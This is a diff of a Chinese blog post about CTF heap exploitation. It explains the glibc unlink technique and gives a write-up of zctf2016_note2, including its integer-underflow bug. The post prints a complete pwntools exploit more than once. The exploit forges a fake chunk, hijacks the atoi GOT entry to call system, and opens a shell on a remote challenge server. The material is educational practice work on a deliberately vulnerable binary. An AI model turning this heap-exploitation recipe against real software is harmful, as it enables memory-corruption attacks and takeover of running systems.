@@ -31,8 +31,11 @@
 <meta property="og:image" content="http://example.com/2021/10/15/unlink/8.png">
 <meta property="og:image" content="http://example.com/2021/10/15/unlink/9.png">
 <meta property="og:image" content="http://example.com/2021/10/15/unlink/10.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/11.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/12.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/13.png">
 <meta property="article:published_time" content="2021-10-14T16:15:59.000Z">
-<meta property="article:modified_time" content="2021-10-15T10:31:52.635Z">
+<meta property="article:modified_time" content="2021-10-21T11:52:26.787Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2021/10/15/unlink/1.jpg">
@@ -93,7 +96,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/10/15/unlink/" data-id="ckus8fgvx0003ssvkab720i9x" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/10/15/unlink/" data-id="ckv0vzm5j0005r8vk46dr3miy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -103,7 +106,7 @@
 <span id="more"></span>
 
 <h1 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h1><p>讲unlink之前还是想再感慨一下，其实这个时候反思一下，才觉得自己原来的学习方法不是太好，刚开始看ctfwiki那些攻击手法真的一点也看不下去，现在想想，每一个攻击手法都是有目的，我们应该先弄清楚，我们通过这个手法获得了什么能力，通过例题最好，去看现象也行，然后再去仔细看那些其他的东西，而不是上来被一大堆指针绕来绕去，最后也不知道文章说了什么。</p>
-<p>所以，我们觉得我们首先应该来看看我们通过unlink获得了什么能力，按照我目前的理解，其实就是我们修改了一个指向chunk的指针ptr,变成了ptr-0x18，大家可能会觉得他没什么卵用，但其实还是有用的，通过他我们可以完成覆写got表等操作。</p>
+<p>所以，我们觉得我们首先应该来看看我们通过unlink获得了什么能力，按照我目前的理解，其实就是我们修改了一个指向chunk的指针ptr变成了&amp;ptr-0x18，这里可能表达不太准确有点抽象，举个例子就清楚了，比如一个数组本身的地址是0xaaaaa里存放着一个指针0xffffff，我们其实就是把0xffffff变成了0xaaaaa-0x18而已，大家可能会觉得他没什么卵用，但其实还是有用的，通过他我们可以完成覆写got表等操作。</p>
 <p>但是现在想要触发unlink，需要通过检测，我还是想先写一下例题，也可以让我自己更好的理解unlink，希望大家跟着一起调一调</p>
 <h1 id="3-2014-HITCON-stkof"><a href="#3-2014-HITCON-stkof" class="headerlink" title="3.2014 HITCON stkof"></a>3.2014 HITCON stkof</h1><p>菜单题，main和menu都没什么好说的，直接看功能吧</p>
 <h2 id="1-alloc"><a href="#1-alloc" class="headerlink" title="1.alloc"></a>1.alloc</h2><p><img src="/2021/10/15/unlink/1.jpg" alt="1"></p>
@@ -164,10 +167,39 @@
 <p>这时你会发现我们竟然绕过了检测，同理下一个检测BK-&gt;fd=p也是一样的道理，如果你看懂了上面这里应该也很好理解，我就不细说了。</p>
 <p>需要注意的是，网上很多文章都是伪代码，比如fakechunk到底是fakechunk的地址还是内容也没有写清楚，总之我就是用取地址符&amp;来指代fakechunk的地址，大家能看懂就好</p>
 <p>如果上面还是觉得抽象，难以理解，不妨代入一下，最上面代码中的p其实就是我们伪造的fakechunk，然后根据我说的自己再绕一绕，应该很快就理解了，最重要的就是要理解我们构造p也就是fakechunk的fd和bk其实是为了创造出两个“逻辑上”的新堆块fakeFD和fakeBK，他们没有具体的chunk的数据结构，仅仅是为了绕过检测而存在。</p>
-<p>明天比赛将近，我应该晚上会去加紧学习tache attack和off by one，希望比赛时候能做出来点题目吧，感觉要学的东西实在是太多了…</p>
+<p>我也没有人教，这里是我自己理解出来认为正确的理解，如果错了希望大佬指正，虽然本博客暂时没开评论功能…</p>
+<p>明天字节ctf比赛将近，我应该晚上会去加紧学习tache attack和off by one，希望比赛时候能做出来点题目吧，感觉要学的东西实在是太多了…</p>
 <p>比完赛会把另外一道例题zctf2016_note2的wp给写了，暂时就放个exp吧</p>
-<h1 id="4-zctf2016-note2"><a href="#4-zctf2016-note2" class="headerlink" title="4.zctf2016_note2"></a>4.zctf2016_note2</h1><p>from pwn import *<br>p = remote(“node4.buuoj.cn”,26635)<br>#p = process(“./note2”)<br>#libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)<br>libc = ELF(“./libc-2.23-buu.so”)<br>elf = ELF(“./note2”)<br>def add(size,content):<br>    p.recvuntil(b”option—&gt;&gt;”)<br>    p.sendline(‘1’)<br>    p.recvuntil(b”Input the length of the note content:(less than 128)”)<br>    p.sendline(str(size))<br>    p.recvuntil(b”Input the note content:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(b”option—&gt;&gt;”)<br>    p.sendline(‘4’)<br>    p.recvuntil(b”Input the id of the note:”)<br>    p.sendline(str(index))<br>    p.recvuntil(b”delete note success!”)<br>def shownote(index):<br>    p.recvuntil(b’option—&gt;&gt;’)<br>    p.sendline(‘2’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>def editnote(index, choice, s):<br>    p.recvuntil(b’option—&gt;&gt;’)<br>    p.sendline(‘3’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>    p.recvuntil(b’2.append]’)<br>    p.sendline(str(choice))<br>    p.sendline(s)<br>p.recvuntil(‘Input your name:’)<br>p.sendline(‘aaaa’)<br>p.recvuntil(‘Input your address:’)<br>p.sendline(‘1111’)<br>ptr = 0x602120<br>fake_fd = ptr - 0x18<br>fake_bk = ptr -0x10<br>content = b’a’*8 + p64(0x61) + p64(fake_fd) + p64(fake_bk) + b’b’*64+p64(0x60)<br>add(128,content)<br>add(0,b’a’*8)<br>add(0x80,b’c’*16)<br>delete(1)<br>content = b’a’*16 + p64(0xa0) + p64(0x90)<br>add(0,content)<br>delete(2)<br>atoi_got = elf.got[‘atoi’]<br>content = b’a’*0x18 + p64(atoi_got)<br>editnote(0,1,content)<br>shownote(0)<br>p.recvuntil(“is “)<br>atoi_addr = u64(p.recv(6).ljust(8, b’\x00’))<br>libc_base = atoi_addr - libc.symbols[‘atoi’]<br>system_addr = libc_base + libc.symbols[‘system’]<br>content = p64(system_addr)<br>editnote(0,1,content)<br>p.recvuntil(“option—&gt;&gt;”)<br>p.sendline(“/bin/sh”)<br>#gdb.attach(p)<br>p.interactive()</p>
-
+<h1 id="4-zctf2016-note2"><a href="#4-zctf2016-note2" class="headerlink" title="4.zctf2016_note2"></a>4.zctf2016_note2</h1><h2 id="1-碎碎念"><a href="#1-碎碎念" class="headerlink" title="1.碎碎念"></a>1.碎碎念</h2><p>虽然猜到字节ctf会很难，但没想到这么难，这pwn都是些什么东西…jspwn安卓pwn，最简单的题目都是我不常遇到的c++，果然又是爆0自闭惹，回来把wp补上，虽然被打自闭了但这几天还是在持续学习，感觉自己会的也越来越多，就是欠的wp有点多，感觉有三四篇了。</p>
+<h2 id="2-exp"><a href="#2-exp" class="headerlink" title="2.exp"></a>2.exp</h2><p>from pwn import *<br>p = remote(“node4.buuoj.cn”,26635)<br>#p = process(“./note2”)<br>#libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)<br>libc = ELF(“./libc-2.23-buu.so”)<br>elf = ELF(“./note2”)<br>def add(size,content):<br>    p.recvuntil(b”option—&gt;&gt;”)<br>    p.sendline(‘1’)<br>    p.recvuntil(b”Input the length of the note content:(less than 128)”)<br>    p.sendline(str(size))<br>    p.recvuntil(b”Input the note content:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(b”option—&gt;&gt;”)<br>    p.sendline(‘4’)<br>    p.recvuntil(b”Input the id of the note:”)<br>    p.sendline(str(index))<br>    p.recvuntil(b”delete note success!”)<br>def shownote(index):<br>    p.recvuntil(b’option—&gt;&gt;’)<br>    p.sendline(‘2’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>def editnote(index, choice, s):<br>    p.recvuntil(b’option—&gt;&gt;’)<br>    p.sendline(‘3’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>    p.recvuntil(b’2.append]’)<br>    p.sendline(str(choice))<br>    p.sendline(s)<br>p.recvuntil(‘Input your name:’)<br>p.sendline(‘aaaa’)<br>p.recvuntil(‘Input your address:’)<br>p.sendline(‘1111’)<br>ptr = 0x602120<br>fake_fd = ptr - 0x18<br>fake_bk = ptr -0x10<br>content = b’a’*8 + p64(0x61) + p64(fake_fd) + p64(fake_bk) + b’b’*64+p64(0x60)<br>add(128,content)<br>add(0,b’a’*8)<br>add(0x80,b’c’*16)<br>delete(1)<br>content = b’a’*16 + p64(0xa0) + p64(0x90)<br>add(0,content)<br>delete(2)<br>atoi_got = elf.got[‘atoi’]<br>content = b’a’*0x18 + p64(atoi_got)<br>editnote(0,1,content)<br>shownote(0)<br>p.recvuntil(“is “)<br>atoi_addr = u64(p.recv(6).ljust(8, b’\x00’))<br>libc_base = atoi_addr - libc.symbols[‘atoi’]<br>system_addr = libc_base + libc.symbols[‘system’]<br>content = p64(system_addr)<br>editnote(0,1,content)<br>p.recvuntil(“option—&gt;&gt;”)<br>p.sendline(“/bin/sh”)<br>#gdb.attach(p)<br>p.interactive()</p>
+<h3 id="3-逆向"><a href="#3-逆向" class="headerlink" title="3.逆向"></a>3.逆向</h3><p>本来都想偷懒了，但是一看程序竟然忘了漏洞点在哪了，自己还是太菜了。还是菜单题，main没啥好看的直接看功能</p>
+<h3 id="1-add"><a href="#1-add" class="headerlink" title="1.add"></a>1.add</h3><p><img src="/2021/10/15/unlink/11.png" alt="11"></p>
+<p>这里咋一看没什么，以至于我刚看的时候忘记了漏洞点在哪，其实是在第15行他自己写的input_content函数</p>
+<p>这里需要注意的是，我们chunk的地址是被存放在ptr这个数组里的，后面我们的unlink也是攻击这里</p>
+<p>我们来看看这个input_content函数</p>
+<p><img src="/2021/10/15/unlink/12.png" alt="12"></p>
+<p>这里乍一看也没啥问题…但是i是一个unsigned的无符号整数，而有符号整数与无符号整数做比较时，会将自己变成无符号整数再比较，这也是我最近看csapp学来的知识，所以当我们将a2这个参数，在add函数中也就是size，设置成0的话，glibc为了满足一个chunk所需要的最起码的prev_size,size,fd,bk,按照规定会分配一个0x20的chunk，而0-1=-1，在unsigned整数里是最大整数，因此永远大于i，于是这里有一个任意写的漏洞。</p>
+<h3 id="2-delte和show"><a href="#2-delte和show" class="headerlink" title="2.delte和show"></a>2.delte和show</h3><p>又短又干净，没啥分析的，不放了</p>
+<h3 id="3-edit"><a href="#3-edit" class="headerlink" title="3.edit"></a>3.edit</h3><p>unsigned __int64 edit()<br>{<br>  _BYTE *v0; // rbx<br>  int v2; // [rsp+8h] [rbp-E8h]<br>  int v3; // [rsp+Ch] [rbp-E4h]<br>  char *src; // [rsp+10h] [rbp-E0h]<br>  __int64 v5; // [rsp+18h] [rbp-D8h]<br>  char dest[128]; // [rsp+20h] [rbp-D0h] BYREF<br>  void *v7; // [rsp+A0h] [rbp-50h]<br>  unsigned __int64 v8; // [rsp+D8h] [rbp-18h]</p>
+<p>  v8 = __readfsqword(0x28u);<br>  if ( index_dword_602160 )<br>  {<br>    puts(“Input the id of the note:”);<br>    v2 = input_num();<br>    if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 3 )<br>    {<br>      src = (char <em>)</em>(&amp;ptr + v2);<br>      v5 = qword_602140[v2];<br>      if ( src )<br>      {<br>        puts(“do you want to overwrite or append?[1.overwrite/2.append]”);<br>        v3 = input_num();<br>        if ( v3 == 1 || v3 == 2 )<br>        {<br>          if ( v3 == 1 )<br>            dest[0] = 0;<br>          else<br>            strcpy(dest, src);<br>          v7 = malloc(0xA0uLL);<br>          strcpy((char *)v7, “TheNewContents:”);<br>          printf((const char *)v7);<br>          input_content((__int64)v7 + 15, 144LL, 10);<br>          sub_400B10((const char *)v7 + 15);<br>          v0 = v7;<br>          v0[v5 - strlen(dest) + 14] = 0;<br>          strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);<br>          strcpy(src, dest);<br>          free(v7);<br>          puts(“Edit note success!”);<br>        }<br>        else<br>        {<br>          puts(“Error choice!”);<br>        }<br>      }<br>      else<br>      {<br>        puts(“note has been deleted”);<br>      }<br>    }<br>  }<br>  else<br>  {<br>    puts(“Please add a note!”);<br>  }<br>  return __readfsqword(0x28u) ^ v8;</p>
+<p>｝</p>
+<p>这里也是够长的，就是普通的edit，选择是覆盖内容，还是在原有内容上加长，有一个小漏洞就是如果加长的话，free(v7)以后相关指针并没有清0，但这里并没有用到，并且他的大小超过fastbin了，所以个人感觉也没啥暖用…</p>
+<h2 id="4-攻击"><a href="#4-攻击" class="headerlink" title="4.攻击"></a>4.攻击</h2><p>还是和上一题差不多，用unlink去打got表</p>
+<h3 id="1-把函数功能写写"><a href="#1-把函数功能写写" class="headerlink" title="1.把函数功能写写"></a>1.把函数功能写写</h3><p>rom pwn import *<br>p = remote(“node4.buuoj.cn”,26635)<br>#p = process(“./note2”)<br>#libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)<br>libc = ELF(“./libc-2.23-buu.so”)<br>elf = ELF(“./note2”)<br>def add(size,content):<br>    p.recvuntil(b”option—&gt;&gt;”)<br>    p.sendline(‘1’)<br>    p.recvuntil(b”Input the length of the note content:(less than 128)”)<br>    p.sendline(str(size))<br>    p.recvuntil(b”Input the note content:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(b”option—&gt;&gt;”)<br>    p.sendline(‘4’)<br>    p.recvuntil(b”Input the id of the note:”)<br>    p.sendline(str(index))<br>    p.recvuntil(b”delete note success!”)<br>def shownote(index):<br>    p.recvuntil(b’option—&gt;&gt;’)<br>    p.sendline(‘2’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>def editnote(index, choice, s):<br>    p.recvuntil(b’option—&gt;&gt;’)<br>    p.sendline(‘3’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>    p.recvuntil(b’2.append]’)<br>    p.sendline(str(choice))<br>    p.sendline(s)</p>
+<p>没啥好说的</p>
+<h3 id="2-似乎不该这么分，我也不知道这里写什么"><a href="#2-似乎不该这么分，我也不知道这里写什么" class="headerlink" title="2.似乎不该这么分，我也不知道这里写什么"></a>2.似乎不该这么分，我也不知道这里写什么</h3><p>ptr = 0x602120<br>fake_fd = ptr - 0x18<br>fake_bk = ptr -0x10<br>content = b’a’*8 + p64(0x61) + p64(fake_fd) + p64(fake_bk) + b’b’*64+p64(0x60)</p>
+<p>add(128,content)//chunk0</p>
+<p>add(0,b’a’*8)//chunk1<br>add(0x80,b’c’*16)//chunk2</p>
+<p>delete(1)//先把chunk1 free<br>content = b’a’*16 + p64(0xa0) + p64(0x90)//覆盖chunk2的prev_size位和size位中的prev_inuse<br>add(0,content)//会把chunk1拿出来并写入造成溢出<br>delete(2)</p>
+<p>这里还是在第一个chunk的地方构造了用于绕过unlink检测的fakechunk，p64(0x60)是为了绕过检测。</p>
+<p>然后注意这里先把chunk1 free了，先把chunk2创建好再次add(0,content)，不然无法造成溢出。</p>
+<p>然后delete（2）触发unlink，这里是覆盖了prev_size位这样系统就会认为他的上一个chunk有0xa0那么长，0xa0是我们设计的长度，自己算一算就知道，于是就会和我们构造的fakechunk处合并并触发unlink</p>
+<p>*16 + p64(0xa0) + p64(0x90)<br>add(0,content)<br>delete(2)<br>atoi_got = elf.got[‘atoi’]<br>content = b’a’*0x18 + p64(atoi_got)<br>editnote(0,1,content)</p>
+<p><img src="/2021/10/15/unlink/13.png" alt="13"></p>
+<p>这里不知道发生了什么就gdb.attach(p)进去看一下，多动手看看，堆就没有那么难，我们只是把chunk0的地址变成了got表的地址。</p>
+<p>然后我们打印chunk0就把got表地址打印出来了，然后就是算偏移泄libc覆写，没啥好说的了</p>
+<p>shownote(0)<br>p.recvuntil(“is “)<br>atoi_addr = u64(p.recv(6).ljust(8, b’\x00’))<br>libc_base = atoi_addr - libc.symbols[‘atoi’]<br>system_addr = libc_base + libc.symbols[‘system’]<br>content = p64(system_addr)<br>editnote(0,1,content)<br>p.recvuntil(“option—&gt;&gt;”)<br>p.sendline(“/bin/sh”)<br>#gdb.attach(p)<br>p.interactive()</p>
+<h3 id><a href="#" class="headerlink" title></a></h3>
       
     </div><!-- .entry-content -->
 
